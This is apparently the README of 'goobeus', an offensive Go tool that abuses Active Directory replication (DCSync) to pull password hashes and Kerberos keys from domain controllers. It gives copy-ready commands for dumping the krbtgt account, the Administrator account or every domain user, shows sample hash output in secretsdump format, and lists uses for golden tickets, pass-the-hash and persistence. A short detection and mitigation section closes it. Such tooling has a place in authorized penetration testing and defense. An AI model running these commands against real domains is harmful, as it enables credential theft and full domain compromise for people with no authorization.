# DCSync Attack Implementation

## Overview

DCSync is a technique that abuses the Active Directory replication protocol (MS-DRSR) to extract password hashes and Kerberos keys from a Domain Controller without requiring local access. This implementation provides a native Go alternative to tools like `secretsdump.py` and `mimikatz lsadump::dcsync`.

## How DCSync Works

### Protocol Flow

```
┌─────────────┐                              ┌─────────────────┐
│   Attacker  │                              │ Domain Controller│
│   (goobeus) │                              │    (DRSR/DRSUAPI)│
└──────┬──────┘                              └────────┬─────────┘
       │                                              │
       │ 1. TCP Connect (EPM → Dynamic Port)          │
       │─────────────────────────────────────────────→│
       │                                              │
       │ 2. RPC Bind (NTLM/SPNEGO Authentication)     │
       │─────────────────────────────────────────────→│
       │                                              │
       │ 3. IDL_DRSBind (Get DRS Handle)              │
       │─────────────────────────────────────────────→│
       │←─────────────────────────────────────────────│
       │                                              │
       │ 4. IDL_DRSCrackNames (Resolve User → GUID)   │
       │─────────────────────────────────────────────→│ (for single user)
       │←─────────────────────────────────────────────│
       │                                              │
       │ 5. IDL_DRSGetNCChanges (Replicate Secrets)   │
       │─────────────────────────────────────────────→│
       │←─────────────────────────────────────────────│
       │       (encrypted password data)              │
       │                                              │
       │ 6. Decrypt with Session Key                  │
       └──────────────────────────────────────────────┘
```

### Required Privileges

DCSync requires one of these permissions on the domain object:

- `DS-Replication-Get-Changes` (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
- `DS-Replication-Get-Changes-All` (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)

By default, these are granted to:

- Domain Admins
- Enterprise Admins  
- Administrators
- Domain Controllers

### Port Usage

| Port | Protocol | Purpose |
|------|----------|---------|
| 135 | TCP | Endpoint Mapper (EPM) - resolves DRSR to dynamic port |
| 49152+ | TCP | DRSR interface (dynamic RPC port) |

## Usage

### Single User Dump

```bash
# Get specific user's credentials
goobeus -d domain.local -u user -p password dcsync --user krbtgt --dc dc01.domain.local

# Using NTLM hash instead of password  
goobeus -d domain.local -u user --hash aad3b435b51404ee:a1b2c3d4e5f6... dcsync --user Administrator --dc dc01.domain.local
```

### Full Domain Dump

```bash
# Dump ALL users (like secretsdump.py -just-dc)
goobeus -d domain.local -u user -p password dcsync --all --dc dc01.domain.local
```

## Output Format

### Single User Output

```
═══════════════════════════════════════════════════════════════
  EXTRACTED CREDENTIALS
═══════════════════════════════════════════════════════════════
  User: krbtgt
  SID:  S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-502

  NT Hash:  ad4bb50597cf43086230fdb25ecee14a
  AES256:   6c69306119a5085703cc4f4bf55623da8966c0538303ccb01657d163889b86ae
  AES128:   b2def8c3d58dcd00692ea6492806d294

  Secretsdump format:
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ad4bb50597cf43086230fdb25ecee14a:::
krbtgt:aes256-cts-hmac-sha1-96:6c69306119a5085703cc4f4bf55623da8966c0538...
krbtgt:aes128-cts-hmac-sha1-96:b2def8c3d58dcd00692ea6492806d294
krbtgt:des-cbc-md5:ae7523521345a4b0
```

### All Users Output

```
─────────────────────────────────────────────────────────────
User:     Administrator
SID:      S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-500
NT Hash:  1a2803ab98942ee503680dd3de3cceb2
─────────────────────────────────────────────────────────────
User:     krbtgt
SID:      S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-502
NT Hash:  ad4bb50597cf43086230fdb25ecee14a
─────────────────────────────────────────────────────────────
...

[*] Secretsdump format (for copy/paste):
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1a2803ab98942ee503680dd3de3cceb2:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ad4bb50597cf43086230fdb25ecee14a:::
...
```

## Technical Implementation

### RPC Operations

1. **IDL_DRSBind**: Establishes replication handle
   - Sends client capabilities via `ExtensionsInt`
   - Returns `DRS_HANDLE` used for subsequent calls

2. **IDL_DRSCrackNames**: Name resolution
   - Converts SAMAccountName to object GUID
   - Uses `DSNameFormatNT4AccountName` → `DSNameFormatUniqueIDName`

3. **IDL_DRSGetNCChanges**: Credential extraction
   - For single user: Uses `EXOP_REPL_SECRETS` with object GUID
   - For all users: Replicates entire Naming Context (NC)
   - Returns encrypted `unicodePwd` and `supplementalCredentials`

### Credential Decryption

- NT hash: Decrypted using `drsuapi.DecryptHash()` with RID and session key
- Kerberos keys: Parsed from `supplementalCredentials` blob
  - `Primary:Kerberos-Newer-Keys` contains AES256, AES128
  - `Primary:Kerberos` contains DES keys

### Single User vs Full Dump

| Mode | RPC Call | Extended Operation | Result |
|------|----------|-------------------|--------|
| `--user` | GetNCChanges | `EXOP_REPL_SECRETS` | Single user with all keys |
| `--all` | GetNCChanges | None (full NC) | All users, NT hash only |

Note: `--all` mode doesn't retrieve Kerberos keys because full NC replication doesn't include `supplementalCredentials` by default.

## Cross-Platform Support

| Platform | Remote DCSync | Notes |
|----------|---------------|-------|
| Linux | ✅ | Full support |
| Windows | ✅ | Full support |
| macOS | ✅ | Should work (untested) |

## Use Cases

1. **Credential Extraction**: Get krbtgt hash for Golden/Sapphire tickets
2. **Lateral Movement**: Extract Administrator hashes for pass-the-hash
3. **Persistence**: Machine account hashes for Silver tickets
4. **Auditing**: Verify password policies and identify weak hashes

## Defense & Detection

### Log Sources

- Windows Security Event ID 4662 (AD object access)
- Windows Security Event ID 4624 (successful logon from replicating IP)
- Network monitoring for RPC traffic to DC ports

### Mitigations

- Limit accounts with replication rights
- Monitor for unusual replication activity
- Use AdminSDHolder to protect sensitive groups
- Implement network segmentation for DCs

## References

- [MS-DRSR]: Directory Replication Service Remote Protocol
- [MS-RPCE]: Remote Procedure Call Protocol Extensions
- Mimikatz DCSync implementation
- Impacket secretsdump.py
